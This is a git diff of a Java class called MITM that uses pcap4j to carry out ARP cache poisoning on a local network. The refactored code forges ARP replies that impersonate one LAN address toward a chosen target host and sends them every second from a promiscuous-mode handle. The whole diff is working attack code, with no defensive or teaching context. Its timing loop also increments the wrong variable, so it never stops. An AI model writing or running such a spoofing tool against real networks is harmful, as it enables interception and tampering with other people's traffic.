@@ -14,6 +14,7 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.Inet4Address;
 import java.net.InetAddress;
+import java.net.NetworkInterface;
 import java.net.UnknownHostException;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
@@ -21,126 +22,106 @@ import java.util.concurrent.Executors;
 
 public class MITM{
 
+    //built based off sendarprequest sample https://github.com/kaitoy/pcap4j/blob/v1/pcap4j-sample/src/main/java/org/pcap4j/sample/SendArpRequest.java
+
     public static void main(String[] args) throws PcapNativeException, IOException, NotOpenException {
         //temporary fix to force pcap4j to use Npcap instead of wpcap
         System.setProperty("jna.library.path", "C:/Windows/System32/Npcap/");
 
-        String[] s = new String[1];
-        s[0] = "192.168.0.104";
+        String targetIP = "192.168.0.118";
+        String spoofedIP = "192.168.0.104";
 
-        //SendArpRequestTemplate.run(s);
+        poisonArp(targetIP, spoofedIP, 30);
 
-       // MacAddress resolved = ARP.resolveMacFromIP("192.168.0.104");
+    }
 
-        //System.out.println("RESOLVED ADDRESS: " + resolved.getAddress().toString());
+    /**
+     * Poisons a target's arp cache with a spoofed ip address
+     * @param targetIP The target to poison
+     * @param spoofedIP The ip to impersonate
+     * @param timeInSeconds The time in seconds to run the poison
+     */
+    private static void poisonArp(String targetIP, String spoofedIP, int timeInSeconds){
+        try {
+            poisonArp(InetAddress.getByName(targetIP), InetAddress.getByName(spoofedIP), timeInSeconds);
+        } catch (UnknownHostException e) {
+            throw new RuntimeException(e);
+        }
+    }
 
-        MacAddress address = null;
+    /**
+     * Poisons a target's arp cache with a spoofed ip address
+     * @param targetIP The target to poison
+     * @param spoofedIP The ip to impersonate
+     * @param timeInSeconds The time in seconds to run the poison
+     */
+    private static void poisonArp(InetAddress targetIP, InetAddress spoofedIP, int timeInSeconds){
+        int timer = 0;
 
-        try{
-            address = MacAddressResolver.resolveMacAddress(InetAddress.getByName("192.168.0.104"));
-        } catch (Exception e) {
+        PcapNetworkInterface networkInterface = null;
+        try {
+            networkInterface = MacAddressResolver.getAvailableNetworkInterface();
+        } catch (PcapNativeException e) {
+            System.out.println("Unable to find viable network interface");
             e.printStackTrace();
         }
 
-        System.out.println("MAC: " + address);
+        if(networkInterface == null){
+            return;
+        }
 
-        PcapNetworkInterface networkInterface = MacAddressResolver.getAvailableNetworkInterface();
-        String targetIP = "192.160.0.104";
-        String sourceIPString = networkInterface.getAddresses().getFirst().getAddress().toString();
-
-        //Attackers Mac Address
         MacAddress sourceMac = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());
-        //TODO: we only want to target one device. do we do broadcast MAC?
-        MacAddress destinationMac = address;
 
-        //Impersonated IP
-        InetAddress sourceIP = InetAddress.getByName("192.168.0.67");
-        //targeted IP
-        InetAddress destinationIP = InetAddress.getByName(targetIP);
+        MacAddress targetMac = MacAddressResolver.resolveMacAddress(targetIP);
 
-        Packet spoofedPacket = arpHelper.createArpPacket(sourceIP, destinationIP, sourceMac, destinationMac, ArpOperation.REPLY);
+        PcapHandle handle;
+        try {
+            handle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
+        } catch (PcapNativeException e) {
+            throw new RuntimeException(e);
+        }
 
-        PcapHandle sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
+        Packet posionedArpPacket = arpHelper.createArpPacket(spoofedIP, targetIP, sourceMac, targetMac, ArpOperation.REPLY);
 
-        sendHandle.sendPacket(spoofedPacket);
+        while(timer < timeInSeconds){
+
+            if(sendSpoofedArp(posionedArpPacket, networkInterface, handle)){
+                System.out.println("Arp poisoned - Target:" + targetIP.getHostAddress() + " Spoof:" + spoofedIP.getHostAddress() + " TargetMac: " + targetMac.toString() + " SourceMac: " + sourceMac.toString());
+            }
+
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            timeInSeconds++;
+        }
+
     }
 
-    private static void sendSPoofedArp() throws PcapNativeException, UnknownHostException, NotOpenException {
-        PcapNetworkInterface networkInterface = null;
-
-        List<PcapNetworkInterface> networkInterfaces = Pcaps.findAllDevs();
-
-        //Find the first available interface with a valid ipv4 address
-        for (PcapNetworkInterface nInterface : networkInterfaces){
-            for(PcapAddress address : nInterface.getAddresses()){
-
-                //find our ipv4 address
-                if(address instanceof PcapIpV4Address){
-
-                    //we dont want our loopback address
-                    if(address.getAddress().isLoopbackAddress()){
-                        continue;
-                    }
-
-                    System.out.println("IP4 Address found:");
-                    System.out.println(address.getAddress().getHostAddress());
-
-                    networkInterface = nInterface;
-                }
-            }
-        }
-
+    /**
+     * Sends an Arp reply packet across an interface
+     * @param posionedArpPacket Arp Packet to send
+     * @param networkInterface Interface to send across
+     * @param handle PCapHandle. Requires handle to be open.
+     * @return True if packet sent successfully
+     */
+    private static boolean sendSpoofedArp(Packet posionedArpPacket, PcapNetworkInterface networkInterface, PcapHandle handle) {
         if (networkInterface == null) {
-            System.exit(1);
+            return false;
+        }
+        if (!handle.isOpen()){
+            return false;
+        }
+        try {
+            handle.sendPacket(posionedArpPacket);
+        } catch (PcapNativeException e) {
+            throw new RuntimeException(e);
+        } catch (NotOpenException e) {
+            throw new RuntimeException(e);
         }
 
-        System.out.println(networkInterface.toString());
-
-        //built based off sendarprequest sample https://github.com/kaitoy/pcap4j/blob/v1/pcap4j-sample/src/main/java/org/pcap4j/sample/SendArpRequest.java
-
-        String targetIP = "192.160.0.104";
-        String sourceIPString = networkInterface.getAddresses().getFirst().getAddress().toString();
-
-
-        PcapHandle handle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
-        PcapHandle sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
-        ExecutorService pool = Executors.newSingleThreadExecutor();
-
-        //Attackers Mac Address
-        MacAddress sourceMac = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());
-        //TODO: we only want to target one device. do we do broadcast MAC?
-        MacAddress destinationMac = MacAddress.getByName("00:00:00:00:00:00");
-
-        //Impersonated IP
-        InetAddress sourceIP = InetAddress.getByName("192.168.0.67");
-        //targeted IP
-        InetAddress destinationIP = InetAddress.getByName(targetIP);
-
-        ArpPacket.Builder arpPacket = new ArpPacket.Builder();
-
-        arpPacket
-                .hardwareType(ArpHardwareType.ETHERNET)
-                .protocolType(EtherType.IPV4)
-                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
-                .protocolAddrLength((byte) sourceIP.getAddress().length)
-                .operation(ArpOperation.REPLY)
-                .srcHardwareAddr(sourceMac)
-                .srcProtocolAddr(sourceIP)
-                .dstHardwareAddr(destinationMac)
-                .dstProtocolAddr(destinationIP);
-
-        EthernetPacket.Builder header = new EthernetPacket.Builder();
-
-        header
-                .dstAddr(destinationMac)
-                .srcAddr(sourceMac)
-                .type(EtherType.ARP)
-                .payloadBuilder(arpPacket)
-                .paddingAtBuild(true);
-
-        Packet spoofedPacket = header.build();
-
-        handle.sendPacket(spoofedPacket);
-        handle.close();
+        System.out.println("Arp sent");
+        return true;
     }
 }
